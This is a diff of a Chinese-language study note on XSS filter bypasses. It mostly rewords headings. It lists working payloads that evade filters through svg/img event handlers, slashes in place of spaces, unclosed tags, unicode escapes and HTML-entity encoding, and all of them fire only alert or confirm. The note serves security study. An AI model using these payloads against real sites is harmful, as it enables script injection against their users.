@@ -217,16 +217,16 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 ...
 ```
 
-### XSS绕过方式
+### XSS payload 变形
 
-* Bypass XSS
+* 参考
   * [s0md3v/AwesomeXSS](https://github.com/s0md3v/AwesomeXSS#awesome-bypassing)
   * [MyPapers/Bypassing-XSS-detection-mechanisms](https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms)
 
 
-* 注意:以下这些Payload
-  * 大多数在Chrome 76.0.3809.132下测试成功，无法执行的已标注
-  * 都没有用到single quotes(') 或 double quotes (")
+* 注意
+  * 以下这些Payload 大多数在Chrome 76.0.3809.132下测试成功，无法执行的已标注
+  * 以下这些Payload 都没有用到single quotes(') 或 double quotes (")
 
 - Without event handlers - 不用事件处理
 ```
@@ -244,14 +244,14 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 <script>confirm()</script>
 ```
 
-- Without space - 不用空格
+- 不使用空格
 ```
 # 用正斜线 / 代替空格
 <svg/onload=confirm()>
 <iframe/src=javascript:alert(1)>
 ```
 
-- Without slash (/) - 不用正斜线`/`
+- 不使用正斜线`/`(slash)
 ```
 # svg标签的事件属性
 <svg onload=confirm()>
@@ -259,14 +259,14 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 <img src=x onerror=confirm()>
 ```
 
-- Without equal sign (=) - 不使用等号`=`
+- 不使用等号`=`(equal sign)
 
 ```
 # 直接 函数名
 <script>confirm()</script>
 ```
 
-- Without closing angular bracket (>) - 不使用右尖括号`>`结束标签
+- 不使用尖括号`>`(angular bracket)来结束标签
 ```
 # 使用//可以结束svg标签 需//之后有任意标签<x> 则svg标签中的JavaScript就能成功执行
 <svg onload=confirm()//
@@ -280,25 +280,23 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 ```
 
 ```
-# svg标签 - 编码 \u编码
+# 事件标签的编码方式 \u编码
 <svg onload=co\u006efirm()>
-
-# svg标签 - 编码 \u编码 畸形属性
 <svg onload=z=co\u006efir\u006d,z()>
 ```
 
 ```
-# svg标签 - 编码 html实体编码
+# 事件标签的编码方式 html实体编码(必须带分号;)
 
 例1
 
 原始payload
 <svg/onload="javascript:alert(1)">
 
-实体编码 十六进制
+html实体编码 十六进制
 <svg/onload="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
 
-实体编码 十进制
+html实体编码 十进制
 <svg/onload="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
 
 ----
@@ -308,15 +306,16 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 原始payload
 <svg/onload=alert(2)>
 
-实体编码 十六进制
+html实体编码 十六进制
 <svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x32;&#x29;>
 
-实体编码 十进制
+html实体编码 十进制
 <svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;&#50;&#41;>
 ```
 
-- Without a Valid HTML tag - 不使用有效的html标签
+- 不使用有效的html标签
 ```
+# 自定义一个名为x的tag
 <x onclick=confirm()>click here
 <x ondrag=confirm()>drag it
 ```
